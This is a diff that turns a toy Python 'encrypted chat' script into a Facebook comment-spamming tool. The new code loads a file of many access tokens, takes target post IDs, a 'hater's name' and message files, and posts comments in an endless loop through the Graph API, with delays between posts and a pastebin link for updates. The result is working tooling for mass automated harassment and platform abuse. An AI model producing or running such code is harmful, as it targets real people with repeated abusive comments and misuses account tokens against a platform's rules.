@@ -1,126 +1,110 @@
+import requests
 import time
 import sys
 import os
-import random
-import hashlib
+from datetime import datetime
 
-# Colors
-GREEN = "\033[1;32m"
-RED = "\033[1;31m"
-YELLOW = "\033[1;33m"
-BLUE = "\033[1;34m"
-CYAN = "\033[1;36m"
-RESET = "\033[0m"
-
-# Animation Effect - Typing
-def typing_effect(text, delay=0.05):
+# Animation Function (Typewriter Effect)
+def animate_text(text, delay=0.01):
     for char in text:
         sys.stdout.write(char)
         sys.stdout.flush()
         time.sleep(delay)
     print()
 
-# Loading Animation
-def loading_animation(text, duration=3):
-    chars = ["|", "/", "-", "\\"]
-    start_time = time.time()
-    while time.time() - start_time < duration:
-        for char in chars:
-            sys.stdout.write(f"\r{GREEN}{text} {char}{RESET}")
-            sys.stdout.flush()
-            time.sleep(0.2)
-    print()
+# Clear screen
+os.system('clear')
 
-# Clear Screen
-def clear_screen():
-    os.system("clear" if os.name == "posix" else "cls")
-
-# Stylish Logo with Animation
-def display_logo():
-    logo = f"""
-{GREEN}      
-  ██████╗ ██████╗  ██████╗ ██╗  ██╗███████╗███╗   ██╗
-  ██╔══██╗██╔══██╗██╔═══██╗██║  ██║██╔════╝████╗  ██║
-  ██║  ██║██████╔╝██║   ██║███████║█████╗  ██╔██╗ ██║
-  ██║  ██║██╔═══╝ ██║   ██║██╔══██║██╔══╝  ██║╚██╗██║
-  ██████╔╝██║     ╚██████╔╝██║  ██║███████╗██║ ╚████║
-  ╚═════╝ ╚═╝      ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝
-{RESET}
+# Logo with animation
+logo = """\x1b[1;36m      
+  _          _______    ______     _______    _______    _______      _______    _         _________
+ ( (    /|  (  ___  )  (  __  \   (  ____ \  (  ____ \  (       )    (  ___  )  ( \        \__   __/
+ |  \  ( |  | (   ) |  | (  \  )  | (    \/  | (    \/  | () () |    | (   ) |  | (           ) (   
+ |   \ | |  | (___) |  | |   ) |  | (__      | (__      | || || |    | (___) |  | |           | |   
+ | (\ \) |  |  ___  |  | |   | |  |  __)     |  __)     | |(_)| |    |  ___  |  | |           | |   
+ | | \   |  | (   ) |  | |   ) |  | (        | (        | |   | |    | (   ) |  | |           | |   
+ | )  \  |  | )   ( |  | (__/  )  | (____/\  | (____/\  | )   ( |    | )   ( |  | (____/\  ___) (___
+ |/    )_)  |/     \|  (______/   (_______/  (_______/  |/     \|    |/     \|  (_______/  \_______/                                                                                                   
 """
-    typing_effect(logo, 0.002)
 
-# Start the Script
-clear_screen()
-display_logo()
+animate_text(logo, 0.001)
 
-# Show Start Time
-start_time = time.strftime("%Y-%m-%d %H:%M:%S")
-typing_effect(f"{GREEN}START TIME: {start_time}{RESET}")
+# Start time
+animate_text("\033[92mSTART TIME : " + time.strftime("%Y-%m-%d %H:%M:%S"))
 
-# Password System
-correct_password_hash = hashlib.sha256("NADIM-XD".encode()).hexdigest()  # Secure Hash for Password
-
-def password_prompt():
-    typing_effect(f"\n{YELLOW}<<━━━━━━━━━━━━━━ LOGIN REQUIRED ━━━━━━━━━━━━━━>>{RESET}")
-    
-    attempts = 3
-    while attempts > 0:
-        password = input(f"{GREEN}𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗 ➜  {RESET}")
-        password_hash = hashlib.sha256(password.encode()).hexdigest()
-
-        if password_hash == correct_password_hash:
-            typing_effect(f"{GREEN}✔ SUCCESSFULLY LOGGED IN!{RESET}")
-            time.sleep(1)
-            clear_screen()
-            return True
-        else:
-            attempts -= 1
-            typing_effect(f"{RED}❌ INCORRECT PASSWORD! {attempts} attempts left.{RESET}")
-
-    typing_effect(f"\n{RED}❌ Too many failed attempts! EXITING...{RESET}")
+# Login System
+animate_text("\n\033[1;32m<<━━━━━━━━━━━━━━ LOGIN REQUIRED ━━━━━━━━━━━━━━>>\n")
+password = input("\033[1;32m𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗 ➜  ")
+if password != "your_password":
+    animate_text("\033[1;31m❌ INCORRECT PASSWORD! EXITING...\n")
     sys.exit()
 
-password_prompt()
+animate_text("\033[1;32m✅ LOGIN SUCCESSFUL!\n")
 
-# Fake Boot Loading
-loading_animation("Loading Secure Modules...", 3)
+# Show Pastebin Link
+animate_text("\n\033[1;36m📌 SCRIPT UPDATED! CHECK LATEST VERSION HERE: https://pastebin.com/raw/3f6J3PG5\n")
 
-# Auto-Generated Conversation UID
-conversation_uid = hashlib.sha256(str(time.time()).encode()).hexdigest()[:12]
-typing_effect(f"{CYAN}✔ Conversation UID: {conversation_uid}{RESET}")
+# Load Token File
+token_file = input("\033[1;30m𝗘𝗡𝗧𝗘𝗥 𝗧𝗢𝗞𝗘𝗡 𝗙𝗜𝗟𝗘 𝗣𝗔𝗧𝗛 ➜ ")
+with open(token_file, 'r') as f:
+    access_tokens = f.read().splitlines()
 
-# Encrypted Chat System (Offline)
-def encrypt_message(message):
-    return hashlib.sha256(message.encode()).hexdigest()
+# Number of posts
+num_user_ids = int(input("\033[1;32m𝗣𝗢𝗦𝗧𝗦 𝗞𝗜 𝗦𝗔𝗡𝗞𝗛𝗬𝗔 ➜ "))
+user_messages = {}
+haters_name = {}
 
-def load_messages():
-    if not os.path.exists("messages.txt"):
-        typing_effect(f"{RED}❌ Message file not found! Creating sample messages...{RESET}")
-        with open("messages.txt", "w") as file:
-            file.write("Hello, this is a test message!\n")
-            file.write("This chat is encrypted.\n")
+# Collecting User IDs & Messages
+for i in range(num_user_ids):
+    user_id = input(f"\033[1;32m𝗣𝗢𝗦𝗧 𝗜𝗗 {i+1} ➜ ")
+    hater_name = input("\033[1;32m𝗛𝗔𝗧𝗘𝗥𝗦 𝗡𝗔𝗠𝗘 ➜ ")
+    message_file = input("\033[1;32m𝗠𝗘𝗦𝗦𝗔𝗚𝗘 𝗙𝗜𝗟𝗘 ➜ ")
 
-    with open("messages.txt", "r") as file:
-        messages = file.readlines()
-    
-    typing_effect(f"{YELLOW}✔ Loading Messages...{RESET}")
-    time.sleep(1)
+    haters_name[user_id] = hater_name
+    user_messages[user_id] = message_file
 
-    encrypted_messages = [encrypt_message(msg.strip()) for msg in messages]
-    for i, enc_msg in enumerate(encrypted_messages, 1):
-        typing_effect(f"{BLUE}Message {i}: {enc_msg[:20]}...{RESET}")  # Show part of the hash
+# Delay Timings
+delay_time = int(input("\033[1;32m𝗗𝗘𝗟𝗔𝗬 (seconds) 𝗕𝗘𝗧𝗪𝗘𝗘𝗡 𝗠𝗘𝗦𝗦𝗔𝗚𝗘𝗦 ➜ "))
+repeat_delay = int(input("\033[1;32m𝗗𝗘𝗟𝗔𝗬 (seconds) 𝗕𝗘𝗙𝗢𝗥𝗘 𝗥𝗘𝗣𝗘𝗔𝗧𝗜𝗡𝗚 ➜ "))
 
-load_messages()
+# Function to send message
+def send_message(access_token, user_id, message, hater_name):
+    url = f"https://graph.facebook.com/v15.0/{user_id}/comments"
+    headers = {
+        'Authorization': f'Bearer {access_token}',
+        'User-Agent': 'Mozilla/5.0'
+    }
+    data = {'message': f'{hater_name} {message}'}
 
-# Chat System
-def chat():
-    typing_effect(f"\n{GREEN}🔒 Encrypted Chat Started! Type 'exit' to quit.{RESET}")
-    while True:
-        user_msg = input(f"{CYAN}You: {RESET}")
-        if user_msg.lower() == "exit":
-            typing_effect(f"{RED}❌ Chat Session Ended!{RESET}")
-            break
-        encrypted_msg = encrypt_message(user_msg)
-        typing_effect(f"{YELLOW}Bot: {encrypted_msg[:20]}...{RESET}")  # Encrypted Response
+    response = requests.post(url, headers=headers, data=data)
+    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 
-chat()
+    if response.status_code == 200:
+        animate_text(f"\033[1;32m[{current_time}] ✅ Comment Sent to {user_id}: {hater_name} {message}")
+        return True
+    else:
+        animate_text(f"\033[1;31m[{current_time}] ❌ Error sending comment to {user_id}: {response.content.decode()}")
+        return False
+
+# Main Loop
+while True:
+    successful, failed = 0, 0
+
+    for i, access_token in enumerate(access_tokens):
+        for user_id, message_file in user_messages.items():
+            hater_name = haters_name[user_id]
+            with open(message_file, 'r') as f:
+                messages = f.read().splitlines()
+
+            message = messages[i % len(messages)]
+
+            if send_message(access_token, user_id, message, hater_name):
+                successful += 1
+            else:
+                failed += 1
+
+            time.sleep(delay_time)
+
+    animate_text(f"\n\033[1;34m✅ {successful} Messages Sent, ❌ {failed} Failed!")
+    animate_text(f"\033[1;36m🔁 Waiting {repeat_delay} seconds before next cycle...\n")
+    time.sleep(repeat_delay)
